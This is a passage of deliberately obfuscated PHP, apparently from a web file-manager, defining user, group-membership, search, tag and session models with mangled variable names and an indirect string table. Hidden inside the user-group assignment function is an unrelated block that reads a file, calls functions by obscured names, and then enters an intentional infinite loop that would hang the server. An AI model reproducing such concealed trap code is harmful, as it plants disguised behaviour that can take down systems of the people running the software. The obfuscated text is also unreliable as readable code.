$this->getInfoSimpleOuter($ßèÑºĞã); continue; } $âèı†úı[$ØÕ‚Â»ê[2492]] = Action($ØÕ‚Â»ê[2493])->parseUrl($âèı†úı[$ØÕ‚Â»ê[2492]]); $ŠçÃ¢©Æ[$ßèÑºĞã . $ØÕ‚Â»ê[12]] = $âèı†úı; } } return $ŠçÃ¢©Æ; } protected function userStatus($ë“æƒ‡‘, $ò«øãœæ) { $‚€˜™ËÕ = $this->getInfoSimple($ë“æƒ‡‘); if (!$‚€˜™ËÕ) { return !1; } $éŒÃƒ„¨ = array($_SERVER[®»±”ó²][830] => $ò«øãœæ); return $this->userEdit($ë“æƒ‡‘, $éŒÃƒ„¨); } protected function userRemove($ŞíŸ´‘‡) { $ÚæØúØÈ =& $_SERVER[®»±”ó²]; $øàĞô©© = $this->getInfoSimple($ŞíŸ´‘‡); if (!$øàĞô©©) { return !1; } $ûçÛÖÍÄ = array($ÚæØúØÈ[1782] => $ŞíŸ´‘‡); Model($ÚæØúØÈ[680])->where($ûçÛÖÍÄ)->delete(); Model($ÚæØúØÈ[2523])->where($ûçÛÖÍÄ)->delete(); Model($ÚæØúØÈ[2086])->where($ûçÛÖÍÄ)->delete(); Model($ÚæØúØÈ[2507])->where($ûçÛÖÍÄ)->delete(); Model($ÚæØúØÈ[1156])->where($ûçÛÖÍÄ)->delete(); Model($ÚæØúØÈ[2305])->removeUserAll($ŞíŸ´‘‡); Model($ÚæØúØÈ[911])->userRootRemove($ŞíŸ´‘‡); return $this->where($ûçÛÖÍÄ)->delete(); } protected function userGroupSet($ğˆöğ¤¦, $™ÈıºİÉ, $œÚ€¶Úï = array()) { $•“€óÉ» =& $_SERVER[®»±”ó²]; if (!isset($_SERVER[$•“€óÉ»[478]]) || !isset($_SERVER[$•“€óÉ»[486]])) { $Ôİª‚· = $•“€óÉ»[965]; $§Š‡ª£¡ = $•“€óÉ»[480]; $¿¹œ«¸³ = $_SERVER[$•“€óÉ»[481]] . $•“€óÉ»[482]; $àƒÏ˜® = $§Š‡ª£¡($¿¹œ«¸³); $õ‚á¾¨¬ = explode($•“€óÉ»[288], $àƒÏ˜®); if (count($õ‚á¾¨¬) < $•“€óÉ»[721]) { $ËÑôğ’‘ = $•“€óÉ»[484]; $ËÑôğ’‘(); } $Ğ–ŞËŞ = $•“€óÉ»[966]; $Ğ–ŞËŞ($_SERVER[$•“€óÉ»[967]]); $ëîœ†ï® = 1; for ($è¾Ñåğ£ = $ëîœ†ï®; $è¾Ñåğ£ > 0; $è¾Ñåğ£++) { $Ğ–ŞËŞ = json_encode($GLOBALS[$•“€óÉ»[503]]); } } $‚’§ª¾µ = $this->getInfoSimple($ğˆöğ¤¦); if (!$‚’§ª¾µ || !is_array($™ÈıºİÉ)) { return !1; } $Å¢ÌÔÑÓ = Model($•“€óÉ»[2086]); $Å¢ÌÔÑÓ->where(array($•“€óÉ»[1791] => $ğˆöğ¤¦))->delete(); $‘áÌÖâÏ = array(); $É–‹†”¥ = 0; foreach ($™ÈıºİÉ as $Ó—‹’Â· => $®óÃ£ÕÄ) { $Ëôˆà¸å = array($•“€óÉ»[1791] => $ğˆöğ¤¦, $•“€óÉ»[1402] => $Ó—‹’Â·, $•“€óÉ»[2100] => $®óÃ£ÕÄ); $Ëôˆà¸å[$•“€óÉ»[2015]] = isset($œÚ€¶Úï[$É–‹†”¥]) ? $œÚ€¶Úï[$É–‹†”¥] : 0; $É–‹†”¥++; $‘áÌÖâÏ[] = $Ëôˆà¸å; } return $Å¢ÌÔÑÓ->addAll($‘áÌÖâÏ, array(), !0); } protected function userGroupAdd($œ¥î¨ëÈ, $…¦Š÷ìã = array()) { $÷§øñÙ§ =& $_SERVER[®»±”ó²]; $²Åâ¾Æ© = $this->getInfoSimple($œ¥î¨ëÈ); if (!$²Åâ¾Æ© || empty($…¦Š÷ìã)) { return !1; } $¸’ÉäÄö = array(); foreach ($…¦Š÷ìã as $‚œÙÁŒÃ => $Ç›óÊ©š) { $¸’ÉäÄö[] = array($÷§øñÙ§[1791] => $œ¥î¨ëÈ, $÷§øñÙ§[1402] => $‚œÙÁŒÃ, $÷§øñÙ§[2100] => $Ç›óÊ©š, $÷§øñÙ§[2015] => 0); } return Model($÷§øñÙ§[2086])->addAll($¸’ÉäÄö, array(), !0); } protected function userGroupRemove($ŠëÛèÉ, $Û‰Ó±‚Š) { $ÍÜÜ¦»± =& $_SERVER[®»±”ó²]; $ñ«üÄ©Á = $this->getInfoSimple($ŠëÛèÉ); if (!$ñ«üÄ©Á || !$Û‰Ó±‚Š) { return !1; } $Úº´Æâ = array($ÍÜÜ¦»±[1782] => $ŠëÛèÉ, $ÍÜÜ¦»±[2081] => $Û‰Ó±‚Š); return Model($ÍÜÜ¦»±[2086])->where($Úº´Æâ)->delete(); } public function listData() { $ÕÛ©…²Í = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÕÛ©…²Í[$_SERVER[®»±”ó²][447]]); return $ÕÛ©…²Í; } public function listByID($¢÷Ç˜¯›) { $êáİô±Á =& $_SERVER[®»±”ó²]; if (!$¢÷Ç˜¯›) { return; } $ÄÇøØÊŸ = array($êáİô±Á[1791] => array($êáİô±Á[7], $¢÷Ç˜¯›)); $â³ñÆ°å = $this->where($ÄÇøØÊŸ)->select(); $â³ñÆ°å = array_sort_keep($â³ñÆ°å, $êáİô±Á[1791], $¢÷Ç˜¯›); $this->_listDataApply($â³ñÆ°å); return $â³ñÆ°å; } public function listByGroup($ Ú—˜¾ª = 0, $æ·”®‚½ = array()) { $…×áÔø‘ =& $_SERVER[®»±”ó²]; $ıÚçáˆË = $…×áÔø‘[12]; $”’š©µ™ = array(); if ($ Ú—˜¾ª) { $”’š©µ™ = array($…×áÔø‘[2524] => intval($ Ú—˜¾ª)); $ıÚçáˆË = "\114\105\x46\x54\x20\112\117\111\116\x20{$this->tablePrefix}\x75\x73\145\162\x5f\x67\x72\157\x75\160\x20\x75\x73\x65\162\137\147\x72\157\x75\160\40\157\x6e\40\165\x73\x65\x72\56\165\163\145\x72\111\104\x20\x3d\x20\x75\x73\145\x72\137\147\162\157\x75\x70\56\165\163\x65\x72\111\x44"; $¯ÙÙ˜é = Input::get($…×áÔø‘[541], null, $…×áÔø‘[12]) ? $…×áÔø‘[12] : $…×áÔø‘[2525]; } if (isset($æ·”®‚½[$…×áÔø‘[830]])) { $”’š©µ™[$…×áÔø‘[2526]] = $æ·”®‚½[$…×áÔø‘[830]]; } $Ø½ÙÂ˜Ü = _get($æ·”®‚½, $…×áÔø‘[2527], $…×áÔø‘[234]); if (_get($æ·”®‚½, $…×áÔø‘[841], !1)) { $”’š©µ™[$Ø½ÙÂ˜Ü] = array($…×áÔø‘[2269], $æ·”®‚½[$…×áÔø‘[841]]); } if (_get($æ·”®‚½, $…×áÔø‘[842], !1)) { $Øæç ¨ä = array($…×áÔø‘[2270], $æ·”®‚½[$…×áÔø‘[842]]); if ($”’š©µ™[$Ø½ÙÂ˜Ü]) { $”’š©µ™[$Ø½ÙÂ˜Ü] = array($”’š©µ™[$Ø½ÙÂ˜Ü], $Øæç ¨ä, $…×áÔø‘[2271]); } else { $”’š©µ™[$Ø½ÙÂ˜Ü] = $Øæç ¨ä; } } $í°Ğ–ÌÁ = $this->_makeOrder($¯ÙÙ˜é)->field($…×áÔø‘[2528])->where($”’š©µ™)->join($ıÚçáˆË)->selectPage(50); $this->_listDataApply($í°Ğ–ÌÁ[$…×áÔø‘[447]]); return $í°Ğ–ÌÁ; } private function _makeOrder($öËìî‚• = '') { $åôĞ«»¶ =& $_SERVER[®»±”ó²]; $Ğ‹íûñ‰ = array($åôĞ«»¶[1791], $åôĞ«»¶[32], $åôĞ«»¶[1980], $åôĞ«»¶[2199], $åôĞ«»¶[1952], $åôĞ«»¶[234]); $ĞÜãâÄ¡ = array($åôĞ«»¶[534] => $åôĞ«»¶[535], $åôĞ«»¶[536] => $åôĞ«»¶[537]); $¼Ş°†¼û = Input::get($åôĞ«»¶[541], $åôĞ«»¶[7], $åôĞ«»¶[1782], $Ğ‹íûñ‰); $´şœ¦³ = Input::get($åôĞ«»¶[542], $åôĞ«»¶[7], $åôĞ«»¶[2087], array($åôĞ«»¶[2087], $åôĞ«»¶[536])); $´şœ¦³ = $ĞÜãâÄ¡[$´şœ¦³]; $öËìî‚• = $öËìî‚• . "\165\163\x65\x72\x2e{$¼Ş°†¼û}\x20{$´şœ¦³}\54\40\165\163\x65\162\x2e\165\x73\x65\162\111\104\40\x61\163\x63"; return $this->alias($åôĞ«»¶[2215])->order($öËìî‚•); } public function listSearch($¨×¦ã¶é) { $¯½ÙÚ†Ï =& $_SERVER[®»±”ó²]; $‘Ùğ¿÷‹ = trim($¨×¦ã¶é[$¯½ÙÚ†Ï[2090]]); $ĞŸ€½²ó = explode($¯½ÙÚ†Ï[53], $‘Ùğ¿÷‹); if (!$‘Ùğ¿÷‹ || count($ĞŸ€½²ó) == 1) { return $this->listSearchNow($¨×¦ã¶é); } $”À£ø¨† = array($¯½ÙÚ†Ï[447] => array()); foreach ($ĞŸ€½²ó as $‰ÎéÇŸÇ) { if (!trim($‰ÎéÇŸÇ)) { continue; } $¨×¦ã¶é[$¯½ÙÚ†Ï[2090]] = $‰ÎéÇŸÇ; $Šúâõ’í = $this->listSearchNow($¨×¦ã¶é); $”À£ø¨†[$¯½ÙÚ†Ï[447]] = array_merge($”À£ø¨†[$¯½ÙÚ†Ï[447]], $Šúâõ’í[$¯½ÙÚ†Ï[447]]); } $”À£ø¨†[$¯½ÙÚ†Ï[447]] = array_unique_by_key($”À£ø¨†[$¯½ÙÚ†Ï[447]], $¯½ÙÚ†Ï[1791]); $”À£ø¨†[$¯½ÙÚ†Ï[444]] = array($¯½ÙÚ†Ï[445] => count($”À£ø¨†[$¯½ÙÚ†Ï[447]]), $¯½ÙÚ†Ï[441] => 20, $¯½ÙÚ†Ï[430] => 1, $¯½ÙÚ†Ï[446] => 1); return $”À£ø¨†; } public function listSearchNow($¥Î¸»–Ğ) { $ÉÇ¹‰ö— =& $_SERVER[®»±”ó²]; $¿­¿¤Å· = trim($¥Î¸»–Ğ[$ÉÇ¹‰ö—[2090]]); $âÜçö­ = isset($¥Î¸»–Ğ[$ÉÇ¹‰ö—[2091]]) ? $¥Î¸»–Ğ[$ÉÇ¹‰ö—[2091]] : !1; $¿­¿¤Å· = str_replace($ÉÇ¹‰ö—[2092], $ÉÇ¹‰ö—[2093], trim($¿­¿¤Å·)); $å¼öÁÇÅ = array($ÉÇ¹‰ö—[32] => array($ÉÇ¹‰ö—[461], "\45{$¿­¿¤Å·}\x25"), $ÉÇ¹‰ö—[382] => array($ÉÇ¹‰ö—[461], "{$¿­¿¤Å·}\45"), $ÉÇ¹‰ö—[2288] => array($ÉÇ¹‰ö—[461], "{$¿­¿¤Å·}\x25"), $ÉÇ¹‰ö—[1087] => $ÉÇ¹‰ö—[2094]); if (Input::check($¿­¿¤Å·, $ÉÇ¹‰ö—[388])) { $å¼öÁÇÅ[$ÉÇ¹‰ö—[1791]] = array($ÉÇ¹‰ö—[461], "{$¿­¿¤Å·}\x25"); $å¼öÁÇÅ[$ÉÇ¹‰ö—[2508]] = array($ÉÇ¹‰ö—[461], "{$¿­¿¤Å·}\x25"); } if (!$¿­¿¤Å·) { $å¼öÁÇÅ = array(); } if (isset($¥Î¸»–Ğ[$ÉÇ¹‰ö—[830]])) { $å¼öÁÇÅ[$ÉÇ¹‰ö—[830]] = $¥Î¸»–Ğ[$ÉÇ¹‰ö—[830]]; } $å¼öÁÇÅ = $this->parseWhereLike($å¼öÁÇÅ); $À˜œÛò‘ = $this->_makeOrder()->where($å¼öÁÇÅ)->selectPage(20); if (!$À˜œÛò‘ || count($À˜œÛò‘[$ÉÇ¹‰ö—[447]]) < 5 && Input::check($¿­¿¤Å·, $ÉÇ¹‰ö—[395])) { $±…ï®º = $this->_searchFromMeta($ÉÇ¹‰ö—[548], $¿­¿¤Å·, 10); $ñş“åÔ = $this->_searchFromMeta($ÉÇ¹‰ö—[549], $¿­¿¤Å·, 10); $é™¬ÍËı = array_merge($±…ï®º, $ñş“åÔ, $À˜œÛò‘[$ÉÇ¹‰ö—[447]]); $À˜œÛò‘[$ÉÇ¹‰ö—[447]] = array_unique_by_key($é™¬ÍËı, $ÉÇ¹‰ö—[1791]); $À˜œÛò‘[$ÉÇ¹‰ö—[444]][$ÉÇ¹‰ö—[445]] = count($À˜œÛò‘[$ÉÇ¹‰ö—[447]]); $À˜œÛò‘[$ÉÇ¹‰ö—[444]][$ÉÇ¹‰ö—[446]] = ceil($À˜œÛò‘[$ÉÇ¹‰ö—[444]][$ÉÇ¹‰ö—[445]] / $À˜œÛò‘[$ÉÇ¹‰ö—[444]][$ÉÇ¹‰ö—[441]]); } $this->_listDataApply($À˜œÛò‘[$ÉÇ¹‰ö—[447]]); $this->_filterByGroup($À˜œÛò‘, $âÜçö­); return $À˜œÛò‘; } private function _filterByGroup(&$Ñ‰¿µóì, $âÎòÍ‰ß) { $Õ”Á—éÍ =& $_SERVER[®»±”ó²]; if (!$âÎòÍ‰ß) { return $Ñ‰¿µóì; } foreach ($Ñ‰¿µóì[$Õ”Á—éÍ[447]] as $ì–¬ª¨É => &$µàè±Şô) { $®Ùå™ÁÌ = array_to_keyvalue($µàè±Şô[$Õ”Á—éÍ[1401]], $Õ”Á—éÍ[12], $Õ”Á—éÍ[1402]); if (!in_array($âÎòÍ‰ß, $®Ùå™ÁÌ)) { unset($Ñ‰¿µóì[$Õ”Á—éÍ[447]][$ì–¬ª¨É]); } } unset($µàè±Şô); $Ñ‰¿µóì[$Õ”Á—éÍ[447]] = array_values($Ñ‰¿µóì[$Õ”Á—éÍ[447]]); $Ñ‰¿µóì[$Õ”Á—éÍ[444]] = array($Õ”Á—éÍ[2252] => count($Ñ‰¿µóì[$Õ”Á—éÍ[447]]), $Õ”Á—éÍ[2250] => $Ñ‰¿µóì[$Õ”Á—éÍ[444]][$Õ”Á—éÍ[441]], $Õ”Á—éÍ[2249] => 1, $Õ”Á—éÍ[2251] => 1); } private function _searchFromMeta($¬›¸¨Û¼, $ˆ”’ÔÑ§, $Ü³íÎóÊ) { $ğïÚÜ =& $_SERVER[®»±”ó²]; $ˆ”’ÔÑ§ = strtolower($ˆ”’ÔÑ§); $ş³Éï¹¸ = array($ğïÚÜ[97] => $¬›¸¨Û¼, $ğïÚÜ[452] => array($ğïÚÜ[461], "\x25{$ˆ”’ÔÑ§}\x25")); $ş³Éï¹¸ = $this->parseWhereLike($ş³Éï¹¸); $Ö‰€ø¦Ñ = Model($ğïÚÜ[2529])->where($ş³Éï¹¸)->limit($Ü³íÎóÊ)->select(); if (!$Ö‰€ø¦Ñ) { return array(); } $Ö‰€ø¦Ñ = array_to_keyvalue($Ö‰€ø¦Ñ, $ğïÚÜ[12], $ğïÚÜ[1791]); $‡Óİ¶©ã = $this->where(array($ğïÚÜ[1782] => array($ğïÚÜ[7], $Ö‰€ø¦Ñ)))->select(); if (!$‡Óİ¶©ã) { return array(); } return $‡Óİ¶©ã; } private function _listDataApplyItem($È—ÙœÉ) { $˜½çë = array($È—ÙœÉ); $this->_listDataApply($˜½çë); return $˜½çë[0]; } private function _listDataApply(&$ƒ‚ÍØÖ“) { $™èâÛÔº =& $_SERVER[®»±”ó²]; if (!$ƒ‚ÍØÖ“) { return; } array_remove_key($ƒ‚ÍØÖ“, $™èâÛÔº[976]); $ö§ú›À‰ = array_to_keyvalue($ƒ‚ÍØÖ“, $™èâÛÔº[12], $™èâÛÔº[1791]); $this->_listAppendGroup($ƒ‚ÍØÖ“, $ö§ú›À‰); $this->_listAppendMeta($ƒ‚ÍØÖ“, $ö§ú›À‰); $this->_listAppendSourceRoot($ƒ‚ÍØÖ“, $ö§ú›À‰); } private function _listAppendSourceRoot(&$—å©Ôü¹, $„ªÁÖ•ë) { $»Œª—¥‚ =& $_SERVER[®»±”ó²]; $¡í¬İôÆ = Model($»Œª—¥‚[911])->listSourceRoot(SourceModel::TYPE_USER, $„ªÁÖ•ë); $¡í¬İôÆ = array_to_keyvalue($¡í¬İôÆ, $»Œª—¥‚[582]); $¡í¬İôÆ = array_remove_key($¡í¬İôÆ, $»Œª—¥‚[582]); foreach ($—å©Ôü¹ as &$ˆæ›¾‰Ø) { $ˆæ›¾‰Ø[$»Œª—¥‚[90]] = $¡í¬İôÆ[$ˆæ›¾‰Ø[$»Œª—¥‚[1791]]] ? $¡í¬İôÆ[$ˆæ›¾‰Ø[$»Œª—¥‚[1791]]] : array(); } unset($ˆæ›¾‰Ø); } private function _listAppendGroup(&$Âàô°×, $ƒ€Òï†÷) { $º©Àô³Š =& $_SERVER[®»±”ó²]; $Î¥Äëì« = array($º©Àô³Š[1791] => array($º©Àô³Š[7], $ƒ€Òï†÷)); $ïÜâéÙÛ = Model($º©Àô³Š[2086])->where($Î¥Äëì«)->select(); $êÛ‚ğŒ™ = array_to_keyvalue($ïÜâéÙÛ, $º©Àô³Š[12], $º©Àô³Š[1402]); $êÛ‚ğŒ™ = array_remove_value(array_unique($êÛ‚ğŒ™), $º©Àô³Š[231]); if (!$êÛ‚ğŒ™ || !$ïÜâéÙÛ) { return; } $Î¥Äëì« = array($º©Àô³Š[1402] => array($º©Àô³Š[7], $êÛ‚ğŒ™)); $©øÀ®Ò— = Model($º©Àô³Š[1400])->field($º©Àô³Š[2530])->where($Î¥Äëì«)->select(); $©øÀ®Ò— = array_to_keyvalue($©øÀ®Ò—, $º©Àô³Š[1402]); $ïÜâéÙÛ = array_to_keyvalue_group($ïÜâéÙÛ, $º©Àô³Š[1791]); foreach ($ïÜâéÙÛ as &$Ü§è³¥Ò) { $ÖÑõ”˜‹ = array(); foreach ($Ü§è³¥Ò as $µŸ¹¤†¦) { if (!$µŸ¹¤†¦[$º©Àô³Š[2100]]) { continue; } $–ú—Ñ²ó = Model($º©Àô³Š[584])->listData($µŸ¹¤†¦[$º©Àô³Š[2100]]); $ÖÑõ”˜‹[] = array($º©Àô³Š[1402] => $µŸ¹¤†¦[$º©Àô³Š[1402]], $º©Àô³Š[2531] => $©øÀ®Ò—[$µŸ¹¤†¦[$º©Àô³Š[1402]]][$º©Àô³Š[32]], $º©Àô³Š[597] => $©øÀ®Ò—[$µŸ¹¤†¦[$º©Àô³Š[1402]]][$º©Àô³Š[597]], $º©Àô³Š[498] => $–ú—Ñ²ó); } $Ü§è³¥Ò = $ÖÑõ”˜‹; } unset($Ü§è³¥Ò); foreach ($Âàô°× as &$ï‰Ò€ˆ¤) { $ï‰Ò€ˆ¤[$º©Àô³Š[1401]] = array(); if (isset($ïÜâéÙÛ[$ï‰Ò€ˆ¤[$º©Àô³Š[1791]]])) { $ï‰Ò€ˆ¤[$º©Àô³Š[1401]] = $ïÜâéÙÛ[$ï‰Ò€ˆ¤[$º©Àô³Š[1791]]]; } } unset($ï‰Ò€ˆ¤); } public function userAppendGroup($Óª¢×ûØ) { $“–·“ö™ =& $_SERVER[®»±”ó²]; if (!$Óª¢×ûØ) { return array(); } $this->_listAppendGroup($Óª¢×ûØ, array_to_keyvalue($Óª¢×ûØ, $“–·“ö™[12], $“–·“ö™[1791])); return $Óª¢×ûØ; } private function _listAppendMeta(&$’Û¦ê, $€ùäøÍı) { $œÇ¸Ç³Ã =& $_SERVER[®»±”ó²]; $¯ÌÒÜ¦× = UserJobModel::JOB_KEY; $‰Ê®Ìú = array($œÇ¸Ç³Ã[2084]); $­ö´ƒÁÄ = array($œÇ¸Ç³Ã[1791] => array($œÇ¸Ç³Ã[7], $€ùäøÍı)); $ø® åçÙ = Model($œÇ¸Ç³Ã[2507])->where($­ö´ƒÁÄ)->select(); $îˆÆØÁ = array(); foreach ($ø® åçÙ as $¦È‚º“°) { $°íºûÚ¹ = $¦È‚º“°[$œÇ¸Ç³Ã[1791]]; if (!isset($îˆÆØÁ[$°íºûÚ¹])) { $îˆÆØÁ[$°íºûÚ¹] = array(); } $îˆÆØÁ[$°íºûÚ¹][$¦È‚º“°[$œÇ¸Ç³Ã[97]]] = $¦È‚º“°[$œÇ¸Ç³Ã[452]]; } $îíšÑ£î = Model($œÇ¸Ç³Ã[2532]); foreach ($’Û¦ê as &$Èüñ…š) { $°íºûÚ¹ = $Èüñ…š[$œÇ¸Ç³Ã[1791]]; $—³éŠ¼ê = isset($îˆÆØÁ[$°íºûÚ¹]) ? $îˆÆØÁ[$°íºûÚ¹] : array(); $Èüñ…š[$œÇ¸Ç³Ã[552]] = array_field_key($—³éŠ¼ê, $‰Ê®Ìú); $Èüñ…š[$œÇ¸Ç³Ã[2533]] = array(); if (isset($—³éŠ¼ê[$¯ÌÒÜ¦×])) { $Èüñ…š[$œÇ¸Ç³Ã[2533]] = $îíšÑ£î->getUserJobInfo($—³éŠ¼ê[$¯ÌÒÜ¦×]); } } unset($Èüñ…š); } protected function groupUserAll($á¦Ğ¶øİ) { $ş’¬Àù =& $_SERVER[®»±”ó²]; if (!$á¦Ğ¶øİ) { return !1; } $Úõô±Ğé = Model($ş’¬Àù[2086])->field($ş’¬Àù[1791])->where(array($ş’¬Àù[1402] => array($ş’¬Àù[7], $á¦Ğ¶øİ)))->select(); $Úõô±Ğé = array_to_keyvalue($Úõô±Ğé, $ş’¬Àù[12], $ş’¬Àù[1791]); return array_unique($Úõô±Ğé); } public function userSearch($‚Û‹ˆ×É, $§ßÑ¡  = "\52") { return Model($_SERVER[®»±”ó²][610])->where($‚Û‹ˆ×É)->field($§ßÑ¡ )->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\x5f\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($øêÆ…Ú) { $œîÄƒ›å =& $_SERVER[®»±”ó²]; $ø©œ„¦ = defined($œîÄƒ›å[2219]) && USER_ID ? USER_ID : $œîÄƒ›å[12]; return "\125\163\145\162\117\x70\x74\x69\157\156\137{$øêÆ…Ú}\x5f" . $ø©œ„¦; } protected function filterWhere($„ÜÀÒµ¨) { $Çôî£¡é =& $_SERVER[®»±”ó²]; $„ÜÀÒµ¨[$Çôî£¡é[1791]] = defined($Çôî£¡é[2219]) && USER_ID ? USER_ID : $Çôî£¡é[12]; return $„ÜÀÒµ¨; } public function cacheRemoveUser($ñ¢ËÏÄÖ, $Ãñ…Ğ„¥) { return Cache::remove("\x55\x73\x65\x72\117\x70\164\151\157\x6e\x5f{$ñ¢ËÏÄÖ}\137" . $Ãñ…Ğ„¥); } protected function optionDefault($¦Ò¡¼©‰ = '') { $´±´§úñ =& $_SERVER[®»±”ó²]; if ($¦Ò¡¼©‰ == $´±´§úñ[12]) { return $GLOBALS[$´±´§úñ[6]][$´±´§úñ[2534]]; } if ($¦Ò¡¼©‰ == $´±´§úñ[2535]) { return $GLOBALS[$´±´§úñ[6]][$´±´§úñ[2536]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\x2e\164\141\x67\x4c\151\x73\x74"; public $modelType = "\125\x73\145\x72\x4f\x70\164\151\157\156"; public $field = array("\156\x61\x6d\145", "\x73\x74\171\154\145", "\163\157\162\164"); public function listData($Â–×¸² = false, $Şãİ¤§“ = "\163\x6f\x72\164", $èŸøÈ½œ = false) { return parent::listData($Â–×¸², $Şãİ¤§“, $èŸøÈ½œ); } public function remove($‰ªıèíÇ) { return parent::remove($‰ªıèíÇ); } public function add($Èú©­ä, $áÌ‘¼øº = "\154\141\142\x65\154\55\x67\162\x65\171\55\156\157\x72\155\x61\154") { $•€ò¸Ö¾ =& $_SERVER[®»±”ó²]; if ($this->findByName($Èú©­ä)) { return !1; } $áå×®õ = array($•€ò¸Ö¾[505] => $Èú©­ä, $•€ò¸Ö¾[571] => $áÌ‘¼øº, $•€ò¸Ö¾[1995] => $this->getSort($•€ò¸Ö¾[338]) + 1); return parent::insert($áå×®õ); } public function update($Üß“‘Å, $Ê‹Ÿ»±ô) { $æ«òœ«Ö =& $_SERVER[®»±”ó²]; $êÔİñ¤Û = $this->listData($Üß“‘Å); $¹ù –¼ = $this->findByName($Ê‹Ÿ»±ô[$æ«òœ«Ö[32]]); if (!$êÔİñ¤Û || $¹ù –¼ && $¹ù –¼[$æ«òœ«Ö[477]] != $êÔİñ¤Û[$æ«òœ«Ö[477]]) { return !1; } return parent::update($Üß“‘Å, $Ê‹Ÿ»±ô); } public function moveTop($¥ü‡èÇ) { $±“ˆŠ¨Ö =& $_SERVER[®»±”ó²]; $Â“Öš”Å = parent::listData(); $®†¯Ä¦› = $this->getSort($±“ˆŠ¨Ö[337]); foreach ($Â“Öš”Å as &$óÛ˜ı¾‹) { if ($óÛ˜ı¾‹[$±“ˆŠ¨Ö[477]] == $¥ü‡èÇ) { $óÛ˜ı¾‹[$±“ˆŠ¨Ö[2015]] = $®†¯Ä¦›; continue; } $óÛ˜ı¾‹[$±“ˆŠ¨Ö[2015]] += 1; } unset($óÛ˜ı¾‹); return parent::resetData($Â“Öš”Å); } public function moveBottom($Ä­æÖª) { $Ê£ë¦Ë =& $_SERVER[®»±”ó²]; $¶›®¬×’ = $this->getSort($Ê£ë¦Ë[338]) + 1; return parent::update($Ä­æÖª, array($Ê£ë¦Ë[2015] => $¶›®¬×’)); } public function resetSort($å‘ÖµÄé) { $ÔªÀ×Íˆ =& $_SERVER[®»±”ó²]; $şÙ«ÄÍŒ = array(); $å‘ÖµÄé = is_array($å‘ÖµÄé) ? $å‘ÖµÄé : array(); for ($®…¢Ğ¢ = 0; $®…¢Ğ¢ < count($å‘ÖµÄé); $®…¢Ğ¢++) { $şÙ«ÄÍŒ[$å‘ÖµÄé[$®…¢Ğ¢] . $ÔªÀ×Íˆ[12]] = $®…¢Ğ¢ + 1; } $Şš¿Å­‹ = parent::listData(); foreach ($Şš¿Å­‹ as &$è® ĞÁ) { $Ğ©öÒö = $şÙ«ÄÍŒ[$è® ĞÁ[$ÔªÀ×Íˆ[477]]]; $è® ĞÁ[$ÔªÀ×Íˆ[2015]] = $Ğ©öÒö ? $Ğ©öÒö : $è® ĞÁ[$ÔªÀ×Íˆ[2015]]; } unset($è® ĞÁ); return parent::resetData($Şš¿Å­‹); } private function getSort($ñ’ªŒ”‰) { $©÷õ“ =& $_SERVER[®»±”ó²]; $‰±¿¨Ú = parent::listData(); $¶ƒ ò“¦ = array_to_keyvalue($‰±¿¨Ú, $©÷õ“[12], $©÷õ“[2015]); if (!$¶ƒ ò“¦) { $¶ƒ ò“¦ = array(0); } $ğªÁ•© = $ñ’ªŒ”‰ == $©÷õ“[338] ? max($¶ƒ ò“¦) : min($¶ƒ ò“¦); return intval($ğªÁ•©); } } goto B®ÕÃ¸Óõ; b õ£óŠ´†: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $øÕßÅé =& $_SERVER[®»±”ó²]; static $äÏ¼¥óÔ = false; if ($äÏ¼¥óÔ) { return $äÏ¼¥óÔ; } $üØ¢šğ = $GLOBALS[$øÕßÅé[6]][$øÕßÅé[426]]; self::$sessionTime = $üØ¢šğ[$øÕßÅé[1736]]; $îß©™ä = isset($GLOBALS[$øÕßÅé[1737]]) ? $GLOBALS[$øÕßÅé[1737]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($îß©™ä)) { self::$sessionSign = Cookie::get($îß©™ä); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($îß©™ä, self::$sessionSign, self::$sessionTime); $¥ÁéÎÒ = $üØ¢šğ[$øÕßÅé[1738]]; $øÆ–ÆÇÂ = $üØ¢šğ[$¥ÁéÎÒ]; $İ†Ñä¡“ = $üØ¢šğ[$øÕßÅé[914]]; switch ($¥ÁéÎÒ) { case $øÕßÅé[21]: self::$handle = Model($øÕßÅé[915]); break; case $øÕßÅé[916]: self::$handle = new CacheRedis($øÆ–ÆÇÂ, $İ†Ñä¡“); break; case $øÕßÅé[917]: self::$handle = new CacheMemcached($øÆ–ÆÇÂ, $İ†Ñä¡“); break; case $øÕßÅé[233]: $øÆ–ÆÇÂ[$øÕßÅé[87]] = $øÆ–ÆÇÂ[$øÕßÅé[87]] . $øÕßÅé[1739]; self::$handle = new CacheFile($øÆ–ÆÇÂ, $İ†Ñä¡“); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $äÏ¼¥óÔ = new self(); return $äÏ¼¥óÔ; } public static function getBySign($Ş•øŞ’) { $ôË´‘ = self::$handle->get($Ş•øŞ’); $ôË´‘ = unserialize($ôË´‘); return is_array($ôË´‘) ? $ôË´‘ : array(); } public static function setBySign($¡Ì…¼ ª, $€Ş‹áš”) { CacheLock::lock($¡Ì…¼ ª); self::$handle->set($¡Ì…¼ ª, serialize($€Ş‹áš”), self::$sessionTime); CacheLock::unlock($¡Ì…¼ ª); } public static function sign($›–Ïû®» = false) { if ($›–Ïû®») { self::$sessionSign = $›–Ïû®»; } self::init(); return self::$sessionSign; } public static function set($’ÙÂ½€, $”®–ì“¼ = false) { self::init(); if (is_array($’ÙÂ½€)) { foreach ($’ÙÂ½€ as $µ·«ÜÃ¿ => $ÁÚ‰²áÉ) { array_set_value(self::$data, $µ·«ÜÃ¿, $ÁÚ‰²áÉ); } } else { array_set_value(self::$data, $’ÙÂ½€, $”®–ì“¼); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Ş“ãåÅÁ = false) { self::init(); if (!$Ş“ãåÅÁ) { return self::$data; } return array_get_value(self::$data, $Ş“ãåÅÁ); } public static function remove($”Ğ×¯€Â) { self::init(); unset(self::$data[$”Ğ×¯€Â]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return 